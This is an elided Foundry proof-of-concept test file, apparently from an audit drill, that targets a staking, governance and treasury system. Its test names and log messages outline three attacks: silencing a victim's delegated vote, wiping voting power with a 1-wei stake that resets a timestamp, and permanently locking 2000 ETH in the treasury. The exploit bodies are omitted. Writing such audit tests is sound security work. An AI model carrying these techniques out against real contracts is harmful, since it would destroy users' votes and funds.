...
contract AttackerContract {
    ...
    constructor(address _staking, address _gov, address payable _treasury) {
        staking = StakingToken(_staking);
        gov = Governance(_gov);
...
contract Drill11PoC is Test {
    ...
    function setUp() public {
        ...
        // Fund treasury with 10,000 ETH (must trigger receive() to update totalFunds)
        vm.deal(address(this), 10_000 ether);
        (bool s,) = address(treasury).call{value: 10_000 ether}("");
        require(s, "fund treasury failed");
    ...
    function test_PoC1_DelegateVoteSilencing() public {
        ...
        console2.log("\n[OK] VICTIM SILENCED! Cannot vote against.");
    ...
    function test_PoC2_StakeTimestampReset() public {
        ...
        console2.log("\n[OK] 29 DAYS OF VOTING POWER DESTROYED BY 1 WEI STAKE");
    }
    ...
    function test_PoC3_TreasuryPermanentLock() public {
        ...
        console2.log("[OK] 2000 ETH PERMANENTLY LOCKED. claimed flag never resets.");
